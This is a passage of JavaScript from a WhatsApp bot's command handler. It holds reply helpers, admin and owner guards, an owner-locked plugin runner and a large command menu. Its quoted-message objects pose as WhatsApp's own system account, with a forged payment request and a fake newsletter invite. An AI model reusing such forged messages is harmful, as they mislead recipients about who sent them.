    key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: 'ownername', participant: '0@s.whatsapp.net' },
    message: {
      requestPaymentMessage: {
        currencyCodeIso4217: 'USD',
        amount1000: 999999999,
        requestFrom: '0@s.whatsapp.net',
        noteMessage: { extendedTextMessage: { text: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD' } },
        expiryTimestamp: 999999999,
        amount: { value: 91929291929, offset: 1000, currencyCode: 'INR' },
      },
    },
  };

  const qchanel = {
    key: { remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net' },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: '120363408083191758@newsletter',
        newsletterName: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
        jpegThumbnail: '',
        caption: settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
        inviteExpiration: Date.now() + 1814400000,
      },
    },
  };

  const qkontak = {
    key: {
      participant: '0@s.whatsapp.net',
      ...(jid ? { remoteJid: 'status@broadcast' } : {}),
    },
    message: {
      contactMessage: {
        displayName: settings.CREDITS || 'james',
        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${settings.CREDITS || 'james'}\nEND:VCARD`,
        sendEphemeral: true,
      },
    },
  };

  const qtext = {
    key: { fromMe: false, participant: '0@s.whatsapp.net', ...(jid ? { remoteJid: '0@s.whatsapp.net' } : {}) },
    message: { extendedTextMessage: { text: `✨ ${settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}` } },
  };

  // ── Log incoming message ──────────────────────────────────
  if (m.message) {
    process.stdout.write('--------------------\n');
    process.stdout.write(`▢ New Message\n`);
    process.stdout.write(
      `   ▢ Date   : ${new Date().toLocaleString()}\n` +
      `   ▢ Body   : ${body || mtype}\n` +
      `   ▢ Sender : ${pushname}\n` +
      `   ▢ JID    : ${senderNumber}\n\n`
    );
  }

  // ── reaction helper ───────────────────────────────────────
  const reaction = async (emoji) => {
    try { await sock.sendMessage(jid, { react: { text: emoji, key: m.key } }); } catch {}
  };

  // ── reply helper ──────────────────────────────────────────
  const blockquote = (text) => text.split('\n').map(line => '> ' + line).join('\n');

    const reply = async (text2) => {
    const out = ft(String(text2), sock);
    const c2 = cfg(sock);

    // ── Extract command name and style it ──
    let title = 'REPLY';
    const rawText = m.text || m.message?.conversation || m.message?.extendedTextMessage?.text || '';
    if (rawText) {
        const prefix = c2.prefix || settings.DEFAULT_PREFIX || '.';
        const trimmed = rawText.trim();
        const cmdPart = trimmed.startsWith(prefix) ? trimmed.slice(prefix.length) : trimmed;
        const firstWord = cmdPart.split(/\s+/)[0] || '';
        if (firstWord) {
            title = firstWord.toUpperCase();
        }
    }

    // ── Style the title using ft() ──
    const styledTitle = ft(title, sock);

    // ── iPhone Mode: plain text only ──
    if (c2.iphoneMode) {
        await sock.sendMessage(jid, { text: out }, { quoted: m });
        return;
    }

    // ── Normal Mode: boxed reply with styled title ──
    const top = `╭━━•›〘 @ ${styledTitle} 〙━•⩵꙰ཱི࿐`;
    const lines = out.split('\n');
    const indented = lines.map(line => line.trim() ? `│ ${line}` : `│`).join('\n');
    const footer = `╰━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐`;
    const boxed = `${top}\n${indented}\n${footer}`;

    const blockquoted = blockquote(boxed);

    const contextInfo = {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
            newsletterName: settings.CHANNEL_NAME || '〖 𝐒𝚰𝐋𝚬𝚴𝐂𝚬𝚪 𝚵𝚳𝐃 〗'
        }
    };

    // Only one message sent – the boxed reply
    await sock.sendMessage(jid, {
        text: blockquoted,
        contextInfo: contextInfo
    }, { quoted: m });
};
// ── replyImg helper ──────────────────────────────────────────
const replyImg = async (image, caption) => {
  try {
    let imgBuffer;
    if (typeof image === 'string' && (image.startsWith('http') || image.startsWith('data:'))) {
      // Fetch from URL or data-URI
      const { data } = await axios.get(image, { responseType: 'arraybuffer', timeout: 10000 });
      imgBuffer = Buffer.from(data);
    } else if (Buffer.isBuffer(image)) {
      imgBuffer = image;
    } else {
      throw new Error('Invalid image input – must be URL or Buffer.');
    }
    // If iPhone mode is enabled, send only text
    if (c.iphoneMode) {
      await sock.sendMessage(jid, { text: caption || '📷 Image omitted (iPhone mode)' }, { quoted: m });
      return;
    }
    await sock.sendMessage(jid, { image: imgBuffer, caption: caption || '' }, { quoted: m });
  } catch (e) {
    // Fallback to plain text if image fails
    await reply(`❌ Image send failed: ${e.message}`);
  }
};
  // ── Guard helpers ─────────────────────────────────────────
  const needGroup  = () => { if (!isGroup) { reply('❌ Group only.').catch(()=>{}); return true; } return false; };
  const needAdmin  = () => {
    if (isAdmins || _isOwner) return false;
    reply('❌ Admins only.').catch(()=>{});
    return true;
  };
  const needBotAdm = () => {
    if (isBotAdmins) return false;
    reply('❌ Add bot as group admin first.').catch(()=>{});
    return true;
  };
  const needOwner  = () => { if (!_isOwner) { reply('❌ Owner only.').catch(()=>{}); return true; } return false; };

  // ════════════════════════════════════════════════════════════
  //   BLACKLORD CHAMBER COMMAND EXECUTION (owner‑locked)
  // ════════════════════════════════════════════════════════════
  // ── BLACKLORD CHAMBER PLUGINS ─────────────────────────────
if (pluginMap.has(cmd)) {
  const blacklordOwner = kontributor[0] || settings.SUDO_NUMBER || '254726433254';
  const blacklordJid = blacklordOwner.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (normalizeJid(sender) !== normalizeJid(blacklordJid)) {
    await reply('❌ Blacklord chamber is locked.');
    return; // ✅ exit the handler, not a break
  }
  try {
    const pluginFn = pluginMap.get(cmd);
    await pluginFn(sock, m, args, reply, reaction, ft, cfg, dlMedia, getQuoted, normNum, getTargetJid);
  } catch (e) {
    console.error(`[BLACKLORD] Plugin "${cmd}" error:`, e);
    await reply(`❌ Plugin error: ${e.message}`);
    const ownerJid = blacklordJid;
    await sock.sendMessage(ownerJid, {
      text: `⚠️ *Plugin "${cmd}" crashed!*\n\n${e.stack || e.message}`
    }).catch(() => {});
  }
  return; // ✅ exit the handler after plugin execution
}


  // ── Start switch ──────────────────────────────────────────
  // If no command was extracted, stop processing
if (!cmd) return;

// ── Start switch ──────────────────────────────────────────
switch (cmd) {

    // ══════════════════════════════════════════════════════
    //   GENERAL
    // ══════════════════════════════════════════════════════


            // ══════════════════════════════════════════════════════
    //   MENU – Interactive (NO DATABASE, IMAGES FROM SETTINGS)
    //   All text in English – Blacklord font
    // ══════════════════════════════════════════════════════
 /*  case 'mnu': {
  await reaction('🌹');

  // ── Build the status caption (exactly as you pasted) ──
  const statusCaption = ft(`
•━═ 〘  𝐗𝐇𝐘𝐏𝐇𝐄𝐑   𝐏𝐑𝐎  〙═━• 

> ╭═━⪩〘 𝑿𝑯𝒀𝑷𝑯𝑬𝑹 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐
> │⫹⫺ 𝗡𝗮𝗺𝗲        : ${myName}
> │⫹⫺ 𝗡𝘂𝗺𝗯𝗲𝗿      : ${myNumber}
> │⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀      : ${myStatus}
> │⫹⫺ 𝗟𝗶𝗺𝗶𝘁       : 0
> │⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲    : ${botName}
> │⫹⫺ 𝗨𝗽𝘁𝗶𝗺𝗲      : ${myUptime}
> │⫹⫺ 𝗠𝗼𝗱𝗲        : ${myMode}
> │⫹⫺ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀    : ${totalFitur} 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀
> │⫹⫺ 𝗨𝘀𝗲𝗿𝘀       : 0 𝘂𝘀𝗲𝗿𝘀
> │⫹⫺ 𝗦𝗽𝗲𝗲𝗱       : ${latensi}𝘀
> │⫹⫺ 𝗦𝗰𝗿𝗶𝗽𝘁      : ${global.name || 'silencer-md-bot'}
> │⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻     : ${global.version || '3.1.0'}
> │⫹⫺ 𝗕𝗮𝗶𝗹𝗲𝘆𝘀     : ${global.description || '@whiskeysockets/baileys'}
> │⫹⫺ 𝗠𝗮𝗶𝗻 𝗙𝗶𝗹𝗲  : ${global.main || 'index.js'}
> │⫹⫺ 𝗣𝗿𝗲𝗳𝗶𝘅      : 𝗠𝘂𝗹𝘁𝗶 𝗣𝗿𝗲𝗳𝗶𝗳
${text ? `> │⫹⫺ ${ft(text, sock)}` : ''}
> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
`, sock);

  // ── Load random thumbnail ──
  const thumbUrls = [
    c.thumbnail2 || settings.DEFAULT_MENU_IMG || 'https://files.catbox.moe/umibj0.jpg',
    'https://res.cloudinary.com/dqxlb29uz/image/upload/v1784728533/bwm_uploads/media-1784728532860.jpg',
  ];
  const thumbUrl = thumbUrls[Math.floor(Math.random() * thumbUrls.length)];
  let thumbBuffer = null;
  try {
    const { data } = await axios.get(thumbUrl, { responseType: 'arraybuffer', timeout: 10000 });
    thumbBuffer = Buffer.from(data);
  } catch {
    thumbBuffer = Buffer.from('');
  }

  const botName = c.botName || settings.BOT_NAME || 'SILENCER';

  // ── Send thumbnail + status as text ──
  await sock.relayMessage(
    jid,
    {
      buttonsMessage: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: botName,
          address: botName,
          jpegThumbnail: thumbBuffer || undefined,
        },
        contentText: statusCaption, // <-- status added here
        footerText: `${botName} Bot`,
        buttons: [
          {
            buttonId: 'allmenu',
            buttonText: { displayText: '📋 All Menu' },
            type: 1
          },
          {
            buttonId: 'cards',
            buttonText: { displayText: '🃏 Cards' },
            type: 1
          }
        ],
        headerType: 6
      }
    },
    { quoted: m, messageId: sock.generateMessageTag?.() || Date.now().toString() }
  );

  break;
}
    */
        // ══════════════════════════════════════════════════════
    //   MENU – XHYPHER PRO STYLE IN BLACKLORD FONT
    //   FULL COMMAND LIST – HARDCODED
    // ══════════════════════════════════════════════════════
      // ══════════════════════════════════════════════════════
    //   ALLMENU – Full hardcoded command list
    //   No database – uses only scope variables
    //   Blacklord font – images from settings
    // ══════════════════════════════════════════════════════
    case 'menu': {
  await reaction('🌹');

  // ── List of menu image URLs ──
  const menuImages = [
    'https://res.cloudinary.com/dqxlb29uz/image/upload/v1784728533/bwm_uploads/media-1784728532860.jpg',
    'https://res.cloudinary.com/dqxlb29uz/image/upload/v1784728701/bwm_uploads/media-1784728700497.jpg',
    // Add more here...
  ];

  // ── Pick random image ──
  const randomMenuUrl = menuImages[Math.floor(Math.random() * menuImages.length)];
  const menuImg = randomMenuUrl;
  const menuThumb = randomMenuUrl; // same as image (or use another list)

  // ── Rest of your code (status values, cmdList, etc.) remains unchanged ──
  // ...

      // ── Status values (safe fallbacks) ──
      const myName = pushname || 'User';
      const myNumber = senderNumber || 'Unknown';
      const myStatus = _isOwner ? '𝗢𝘄𝗻𝗲𝗿' : isPremium ? '𝗣𝗿𝗲𝗺𝗶𝘂𝗺' : '𝗙𝗿𝗲𝗲';
      const myMode = sock.public ? '𝗣𝘂𝗯𝗹𝗶𝗰' : '𝗦𝗲𝗹𝗳';
      const myUptime = typeof runtime === 'function' ? runtime(process.uptime()) : formatUptime(process.uptime() * 1000);
      const totalFitur = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
      const botName = c.botName || settings.BOT_NAME || '𝐒𝐈𝐋𝐄𝐍𝐂𝐄𝐑';
      const latensi = (performance.now() - performance.now()).toFixed(4);

      // ── Status caption (styled with ft) ──
      const statusCaption = ft(`
•━═ 〘   𝐒𝚰𝐋𝚬𝚴𝐂𝚬𝚪 𝚵𝚳𝐃  〙═━•

> ╭═━⪩〘𝐒𝐈𝐋𝐄𝐍𝐂𝐄𝐑 𝐕𝟑 〙•━•⩵꙰ཱི࿐
> │⫹⫺ 𝗧𝗮𝗿𝗴𝗲𝘁       : ${myName}
> │⫹⫺ 𝗜𝗗           : ${myNumber}
> │⫹⫺ 𝗥𝗮𝗻𝗸        : ${myStatus}
> │⫹⫺ 𝗔𝗺𝗺𝗼        : 0
> │⫹⫺ 𝗪𝗲𝗮𝗽𝗼𝗻     : silencer
> │⫹⫺ 𝗠𝗶𝘀𝘀𝗶𝗼𝗻 𝗧𝗶𝗺𝗲 : ${myUptime}
> │⫹⫺ 𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻   : ${myMode}
> │⫹⫺ 𝗔𝗿𝘀𝗲𝗻𝗮𝗹    : ${totalFitur} 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀
> │⫹⫺ 𝗛𝗼𝘀𝘁𝗶𝗹𝗲𝘀    : 0 𝘂𝘀𝗲𝗿𝘀
> │⫹⫺ 𝗩𝗲𝗹𝗼𝗰𝗶𝘁𝘆    : ${latensi}𝘀
> │⫹⫺ 𝗖𝗼𝗱𝗲𝗻𝗮𝗺𝗲   : ${global.name || 'silencer-md-bot'}
> │⫹⫺ 𝗕𝘂𝗶𝗹𝗱       : ${global.version || '3.1.0'}
> │⫹⫺ 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹   : ${global.description || '@whiskeysockets/baileys'}
> │⫹⫺ 𝗖𝗼𝗿𝗲        : ${global.main || 'silencer.js'}
> │⫹⫺ 𝗧𝗿𝗶𝗴𝗴𝗲𝗿    : 𝗠𝘂𝗹𝘁𝗶 𝗣𝗿𝗲𝗳𝗶𝗳
> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
`, sock);

      // ── Full hardcoded command list in Blacklord font ──
      const cmdList = `

> ╭═━⪩ 〖  𝑶𝑾𝑵𝑬𝑹  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒓𝒆𝒂𝒍𝒃𝒂𝒏
> │❍ 𝒃𝒂𝒏𝒈𝒄
> │❍ 𝒔𝒆𝒕𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> │❍ 𝒑𝒓𝒆𝒇𝒊𝒙𝒇𝒓𝒆𝒆
> │❍ 𝒔𝒆𝒕𝒑𝒓𝒆𝒇𝒊𝒙
> │❍ 𝒔𝒆𝒕𝒐𝒘𝒏𝒆𝒓
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒏𝒂𝒎𝒆
> │❍ 𝒔𝒆𝒕𝒎𝒆𝒏𝒖𝒊𝒎𝒈
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒊𝒎𝒈
> │❍ 𝒔𝒆𝒕𝒇𝒐𝒏𝒕𝒔
> │❍ 𝒑𝒖𝒃𝒍𝒊𝒄
> │❍ 𝒔𝒆𝒍𝒇
> │❍ 𝒂𝒅𝒅𝒑𝒓𝒆𝒎
> │❍ 𝒅𝒆𝒍𝒑𝒓𝒆𝒎
> │❍ 𝒂𝒏𝒕𝒊𝒅𝒆𝒍𝒆𝒕𝒆
> │❍ 𝒊𝒑𝒉𝒐𝒏𝒆𝒎𝒐𝒅𝒆
> │❍ 𝒂𝒖𝒕𝒐𝒗𝒊𝒆𝒘𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒂𝒖𝒕𝒐𝒍𝒊𝒌𝒆𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒂𝒏𝒕𝒊𝒄𝒂𝒍𝒍
> │❍ 𝒃𝒍𝒐𝒄𝒌
> │❍ 𝒖𝒏𝒃𝒍𝒐𝒄𝒌
> │❍ 𝒍𝒊𝒔𝒕𝒃𝒍𝒐𝒄𝒌𝒆𝒅
> │❍ 𝒃𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕
> │❍ 𝒑𝒂𝒊𝒓
> │❍ 𝒋𝒐𝒊𝒏𝒈𝒄
> │❍ 𝒋𝒐𝒊𝒏
> │❍ 𝒂𝒅𝒅𝒐𝒘𝒏𝒆𝒓
> │❍ 𝒂𝒅𝒅𝒐𝒘𝒏
> │❍ 𝒅𝒆𝒍𝒐𝒘𝒏𝒆𝒓
> │❍ 𝒅𝒆𝒍𝒐𝒘𝒏
> │❍ 𝒍𝒊𝒔𝒕𝒐𝒘𝒏𝒆𝒓
> │❍ 𝒍𝒊𝒔𝒕𝒐𝒘𝒏
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒑𝒑
> │❍ 𝒔𝒆𝒕𝒑𝒑𝒃𝒐𝒕
> │❍ 𝒅𝒆𝒍𝒑𝒑𝒃𝒐𝒕
> │❍ 𝒔𝒆𝒕𝒃𝒐𝒕𝒃𝒊𝒐
> │❍ 𝒔𝒆𝒕𝒃𝒊𝒐𝒃𝒐𝒕
> │❍ 𝒂𝒖𝒕𝒐𝒓𝒆𝒂𝒅
> │❍ 𝒂𝒖𝒕𝒐𝒕𝒚𝒑𝒊𝒏𝒈
> │❍ 𝒂𝒖𝒕𝒐𝒃𝒊𝒐
> │❍ 𝒐𝒏𝒍𝒚𝒈𝒄
> │❍ 𝒐𝒏𝒍𝒚𝒑𝒄
> │❍ 𝒐𝒏𝒍𝒚𝒂𝒅𝒎𝒊𝒏
> │❍ 𝒂𝒅𝒅𝒄𝒂𝒔𝒆
> │❍ 𝒅𝒆𝒍𝒄𝒂𝒔𝒆
> │❍ 𝒍𝒊𝒔𝒕𝒄𝒂𝒔𝒆
> │❍ 𝒈𝒆𝒕𝒄𝒂𝒔𝒆
> │❍ 𝒈𝒑
> │❍ 𝒈𝒆𝒕𝒑𝒍𝒖𝒈𝒊𝒏
> │❍ 𝒈𝒆𝒕𝒑𝒍𝒖𝒈𝒊𝒏𝒔
> │❍ 𝒄𝒓𝒆𝒂𝒕𝒆𝒈𝒄
> │❍ 𝒃𝒂𝒄𝒌𝒖𝒑𝒔𝒄
> │❍ 𝒔𝒆𝒏𝒅𝒄𝒉𝒂𝒕
> │❍ 𝒂𝒅𝒅𝒍𝒊𝒎𝒊𝒕
> │❍ 𝒂𝒅𝒅𝒔𝒆𝒘𝒂
> │❍ 𝒍𝒊𝒔𝒕𝒔𝒆𝒘𝒂
> │❍ 𝒔𝒆𝒕𝒎𝒆𝒏𝒖
> │❍ 𝒃𝒂𝒏
> │❍ 𝒖𝒏𝒃𝒂𝒏
> │❍ 𝒔𝒆𝒕𝒂𝒖𝒕𝒐𝒃𝒂𝒄𝒌𝒖𝒑
> │❍ 𝒑𝒍𝒂𝒚𝒄𝒉
> │❍ 𝒍𝒊𝒔𝒕𝒅𝒃𝒖𝒔𝒆𝒓
> │❍ 𝒓𝒆𝒒
> │❍ 𝒍𝒊𝒔𝒕𝒓𝒆𝒒
> │❍ 𝒅𝒆𝒍𝒓𝒆𝒒
> │❍ 𝒂𝒅𝒅𝒔𝒂𝒍𝒅𝒐
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍-𝒎
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑮𝑹𝑶𝑼𝑷  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒑𝒓𝒐𝒎𝒐𝒕𝒆
> │❍ 𝒅𝒆𝒎𝒐𝒕𝒆
> │❍ 𝒌𝒊𝒄𝒌
> │❍ 𝒎𝒖𝒕𝒆
> │❍ 𝒖𝒏𝒎𝒖𝒕𝒆
> │❍ 𝒕𝒂𝒈𝒂𝒍𝒍
> │❍ 𝒕𝒂𝒈𝒂𝒅𝒎𝒊𝒏𝒔
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒍𝒊𝒏𝒌
> │❍ 𝒓𝒆𝒗𝒐𝒌𝒆
> │❍ 𝒈𝒓𝒐𝒖𝒑𝒊𝒏𝒇𝒐
> │❍ 𝒔𝒆𝒕𝒈𝒏𝒂𝒎𝒆
> │❍ 𝒔𝒆𝒕𝒈𝒅𝒆𝒔𝒄
> │❍ 𝒉𝒊𝒅𝒆𝒕𝒂𝒈
> │❍ 𝒘𝒂𝒓𝒏
> │❍ 𝒓𝒆𝒔𝒆𝒕𝒘𝒂𝒓𝒏
> │❍ 𝒘𝒂𝒓𝒏𝒊𝒏𝒈𝒔
> │❍ 𝒂𝒏𝒕𝒊𝒍𝒊𝒏𝒌
> │❍ 𝒂𝒏𝒕𝒊𝒎𝒆𝒅𝒊𝒂
> │❍ 𝒘𝒆𝒍𝒄𝒐𝒎𝒆
> │❍ 𝒈𝒐𝒐𝒅𝒃𝒚𝒆
> │❍ 𝒍𝒐𝒄𝒌
> │❍ 𝒖𝒏𝒍𝒐𝒄𝒌
> │❍ 𝒆𝒗𝒆𝒓𝒚𝒐𝒏𝒆
> │❍ 𝒂𝒅𝒎𝒊𝒏𝒔
> │❍ 𝒍𝒊𝒔𝒕𝒈𝒓𝒐𝒖𝒑𝒔
> │❍ 𝒎𝒆𝒎𝒃𝒆𝒓𝒔
> │❍ 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒂𝒍𝒍
> │❍ 𝒓𝒆𝒋𝒆𝒄𝒕𝒂𝒍𝒍
> │❍ 𝒄𝒉𝒆𝒄𝒌𝒑𝒆𝒏𝒅𝒊𝒏𝒈
> │❍ 𝒅𝒊𝒔𝒂𝒑
> │❍ 𝒂𝒏𝒕𝒊𝒎𝒆𝒏𝒕𝒊𝒐𝒏
> │❍ 𝒂𝒏𝒕𝒊𝒔𝒑𝒂𝒎
> │❍ 𝒂𝒏𝒕𝒊𝒃𝒐𝒕
> │❍ 𝒔𝒍𝒐𝒘𝒎𝒐𝒅𝒆
> │❍ 𝒆𝒏𝒅𝒑𝒐𝒍𝒍
> │❍ 𝒔𝒆𝒕𝒘𝒆𝒍𝒄𝒐𝒎𝒆𝒎𝒔𝒈
> │❍ 𝒔𝒆𝒕𝒈𝒐𝒐𝒅𝒃𝒚𝒆𝒎𝒔𝒈
> │❍ 𝒌𝒊𝒄𝒌𝒊𝒏𝒂𝒄𝒕𝒊𝒗𝒆
> │❍ 𝒎𝒖𝒕𝒆𝒍𝒊𝒔𝒕
> │❍ 𝒔𝒐𝒇𝒕𝒃𝒂𝒏
> │❍ 𝒌𝒊𝒄𝒌𝒂𝒍𝒍
> │❍ 𝒂𝒏𝒕𝒊𝒗𝒊𝒅𝒆𝒐
> │❍ 𝒂𝒏𝒕𝒊𝒑𝒉𝒐𝒕𝒐
> │❍ 𝒂𝒏𝒕𝒊𝒇𝒐𝒕𝒐
> │❍ 𝒂𝒏𝒕𝒊𝒔𝒕𝒂𝒕𝒖𝒔𝒎𝒆𝒏𝒕𝒊𝒐𝒏
> │❍ 𝒂𝒏𝒕𝒊𝒕𝒂𝒈𝒔𝒘
> │❍ 𝒂𝒏𝒕𝒊𝒘𝒂𝒎𝒆
> │❍ 𝒂𝒏𝒕𝒊𝒍𝒊𝒏𝒌𝒄𝒉
> │❍ 𝒂𝒏𝒕𝒊𝒍𝒊𝒏𝒌𝒊𝒈
> │❍ 𝒔𝒆𝒕𝒑𝒑𝒈𝒄
> │❍ 𝒔𝒆𝒕𝒈𝒓𝒐𝒖𝒑𝒑𝒊𝒄
> │❍ 𝒅𝒆𝒍𝒑𝒑𝒈𝒄
> │❍ 𝒅𝒆𝒍𝒈𝒓𝒐𝒖𝒑𝒑𝒊𝒄
> │❍ 𝒂𝒅𝒅𝒃𝒂𝒅𝒘𝒐𝒓𝒅
> │❍ 𝒅𝒆𝒍𝒃𝒂𝒅𝒘𝒐𝒓𝒅
> │❍ 𝒍𝒊𝒔𝒕𝒃𝒂𝒅𝒘𝒐𝒓𝒅𝒔
> │❍ 𝒍𝒊𝒔𝒕𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
> │❍ 𝒍𝒊𝒔𝒕
> │❍ 𝒂𝒅𝒅𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
> │❍ 𝒂𝒅𝒅𝒍𝒊𝒔𝒕
> │❍ 𝒅𝒆𝒍𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
> │❍ 𝒅𝒆𝒍𝒍𝒊𝒔𝒕
> │❍ 𝒖𝒑𝒅𝒂𝒕𝒆𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆
> │❍ 𝒖𝒑𝒅𝒂𝒕𝒆𝒍𝒊𝒔𝒕
> │❍ 𝒂𝒃𝒔𝒆𝒏
> │❍ 𝒂𝒕𝒕𝒆𝒏𝒅𝒂𝒏𝒄𝒆
> │❍ 𝒍𝒊𝒔𝒕𝒂𝒃𝒔𝒆𝒏
> │❍ 𝒍𝒊𝒔𝒕𝒂𝒕𝒕𝒆𝒏𝒅𝒂𝒏𝒄𝒆
> │❍ 𝒔𝒆𝒏𝒅𝒕𝒐𝒈𝒓𝒐𝒖𝒑
> │❍ 𝒕𝒐𝒔𝒘𝒈𝒄
> │❍ 𝒔𝒆𝒕𝒘𝒆𝒍𝒄𝒐𝒎𝒆𝒊𝒎𝒂𝒈𝒆
> │❍ 𝒔𝒆𝒕𝒈𝒐𝒐𝒅𝒃𝒚𝒆𝒊𝒎𝒂𝒈𝒆
> │❍ 𝒎𝒖𝒕𝒆𝒈𝒄
> │❍ 𝒎𝒖𝒕𝒆𝒈𝒓𝒐𝒖𝒑
> │❍ 𝒔𝒆𝒕𝒏𝒂𝒎𝒆𝒈𝒄
> │❍ 𝒔𝒆𝒕𝒈𝒓𝒐𝒖𝒑𝒏𝒂𝒎𝒆
> │❍ 𝒔𝒆𝒕𝒅𝒆𝒔𝒄𝒈𝒄
> │❍ 𝒔𝒆𝒕𝒈𝒓𝒐𝒖𝒑𝒅𝒆𝒔𝒄
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑼𝑻𝑰𝑳𝑰𝑻𝒀  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒕𝒊𝒄𝒌𝒆𝒓
> │❍ 𝒕𝒐𝒊𝒎𝒈
> │❍ 𝒗𝒗
> │❍ 𝒒𝒓
> │❍ 𝒘𝒆𝒂𝒕𝒉𝒆𝒓
> │❍ 𝒕𝒓
> │❍ 𝒖𝒑𝒍𝒐𝒂𝒅𝒔𝒕𝒂𝒕𝒖𝒔
> │❍ 𝒔𝒆𝒕𝒎𝒚𝒑𝒑
> │❍ 𝒈𝒆𝒕𝒑𝒑
> │❍ 𝒕𝒕𝒔
> │❍ 𝒕𝒐𝒖𝒓𝒍
> │❍ 𝒐𝒄𝒓
> │❍ 𝒔𝒉𝒐𝒓𝒕𝒆𝒏
> │❍ 𝒇𝒓𝒊𝒆𝒏𝒅𝒔
> │❍ 𝒑𝒍𝒂𝒚
> │❍ 𝒑𝒍𝒂𝒚𝒅𝒐𝒄
> │❍ 𝒊𝒅𝒄𝒉
> │❍ 𝒍𝒚𝒓𝒊𝒄𝒔
> │❍ 𝒊𝒎𝒂𝒈𝒊𝒏𝒆
> │❍ 𝒄𝒂𝒓𝒃𝒐𝒏
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎
> │❍ 𝒕𝒊𝒌𝒕𝒐𝒌
> │❍ 𝒇𝒂𝒄𝒆𝒃𝒐𝒐𝒌
> │❍ 𝒕𝒘𝒊𝒕𝒕𝒆𝒓
> │❍ 𝒑𝒊𝒏𝒕𝒆𝒓𝒆𝒔𝒕
> │❍ 𝒔𝒑𝒐𝒕𝒊𝒇𝒚
> │❍ 𝒚𝒕𝒎𝒑𝟒
> │❍ 𝒃𝒂𝒔𝒆𝟔𝟒
> │❍ 𝒖𝒏𝒃𝒂𝒔𝒆𝟔𝟒
> │❍ 𝒘𝒉𝒐𝒊𝒔
> │❍ 𝒓𝒆𝒗𝒆𝒓𝒔𝒆𝒈𝒊𝒇
> │❍ 𝒂𝒕𝒕𝒑
> │❍ 𝒆𝒎𝒐𝒋𝒊𝒎𝒊𝒙
> │❍ 𝒓𝒗𝒐
> │❍ 𝒓𝒆𝒂𝒅𝒗𝒊𝒆𝒘𝒐𝒏𝒄𝒆
> │❍ 𝒕𝒐𝒖𝒓𝒍𝟏
> │❍ 𝒖𝒑𝒍𝒐𝒂𝒅
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑭𝑼𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒋𝒐𝒌𝒆
> │❍ 𝒇𝒂𝒄𝒕
> │❍ 𝒒𝒖𝒐𝒕𝒆
> │❍ 𝒅𝒂𝒓𝒆
> │❍ 𝒕𝒓𝒖𝒕𝒉
> │❍ 𝒓𝒊𝒅𝒅𝒍𝒆
> │❍ 𝒓𝒐𝒂𝒔𝒕
> │❍ 𝒔𝒉𝒊𝒑
> │❍ 𝒄𝒐𝒊𝒏𝒇𝒍𝒊𝒑
> │❍ 𝒅𝒊𝒄𝒆
> │❍ 𝒎𝒂𝒈𝒊𝒄𝟖
> │❍ 𝒉𝒐𝒓𝒐𝒔𝒄𝒐𝒑𝒆
> │❍ 𝒎𝒆𝒎𝒆
> │❍ 𝒄𝒂𝒕
> │❍ 𝒅𝒐𝒈
> │❍ 𝒘𝒂𝒊𝒇𝒖
> │❍ 𝒂𝒏𝒊𝒎𝒆
> │❍ 𝒕𝒓𝒊𝒗𝒊𝒂
> │❍ 𝒄𝒐𝒎𝒑𝒍𝒊𝒎𝒆𝒏𝒕
> │❍ 𝒃𝒐𝒓𝒆𝒅
> │❍ 𝒓𝒑𝒔
> │❍ 𝒎𝒂𝒕𝒉
